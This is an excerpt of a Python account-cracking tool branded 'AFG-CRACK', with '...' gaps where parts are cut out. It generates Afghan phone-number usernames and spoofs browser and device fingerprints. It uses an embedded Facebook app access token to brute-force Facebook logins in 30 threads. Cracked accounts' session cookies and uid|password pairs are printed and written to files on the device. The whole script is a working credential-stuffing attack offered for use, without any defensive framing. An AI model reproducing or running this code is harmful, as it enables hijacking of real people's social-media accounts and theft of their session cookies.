#BASIR KARIMI  
#AFG
#CONTACT WITH MRr BASIR WHATSAPP : +93747976476
#FOLLOWMY FACEBOOKACCOUNT : https://www.facebook.com/BaSir.OffiCail.AcCount4k
...
usr=[]
try:
	bk=requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/ua.txt').text.splitlines()
	for us in bk:
		usr.append(us)
except: pass
...
for mtc in range(10000):
	rr=random.randint
	bk=f"Mozilla/5.0 (Macintosh; Intel Mac OS {str(rr(7,15))} {str(rr(7,15))}_{str(rr(1,9))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))} Safari/537.36 OPR/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))}"
	ruz.append(bk)
...
\033[1;90m   ____ ____ ____    ____ ____ ____ ____ _  _   
\033[1;91m   |__| |___ | __    |    |__/ |__| |    |_/ 
\033[1;92m   |  | |    |__]    |___ |  \ |  | |___ | \_ 
\x1b[1;97m  ╔═══════════════════════════════════════════╗ 
\x1b[1;97m  ║  \x1b[1;94m AUTHER     :  BASIR HACK 
\x1b[1;97m  ║\x1b[1;94m   GITHUB     :  BASIR44 
\x1b[1;97m  ║ \x1b[1;94m  FACEBOOK   :  BASIR KARIMI              
\x1b[1;97m  ╚═══════════════════════════════════════════╝\033[1;37m""")
...
def AFG():
		...
		for nmbr in range(limit):
			...
			user.append(nmp)
		with tred(max_workers=30) as Basir:	
			clear()
			tl = str(len(user))
...
basir1 = [ 'MTN', 'AWCC', 'Roshan', 'Etisalat']
basir = random.choice(basir1)
def Basir1(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[37;41m [AFG-CRACK]\33[0;m %s|\033[1;32mOK:-%s \033[1;31m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        fblc = device['fblc']
                        fbcr = sim_id
                        Fjj=random.choice(basir)
                        Fjjj=random.choice(basir)
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        ...
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        bk =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{bk}"]'
                        li = ['28','29','210']
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\033[1;32m[SUCCESS] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍪]\033[0;32m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                                        print("")
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print('\r\r\033[31;47m'"Cookie:\33[0;m\033[1;32m "+coki)
                                        open('/sdcard/afg-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/afg-ok.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[37;41m [LOCKED]\33[0;m '+str(uid)+' | '+pas+'\033[1;97m')
                                        print("")
                                        open('/sdcard/afg-cp.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
#---------------------[END MENU]---------------------#
#TANKS FOR USE MY FILES ðŸ¥°â¤
#DON'T FORGET ALLAH ðŸ•ŠðŸ‘†ðŸ•‹
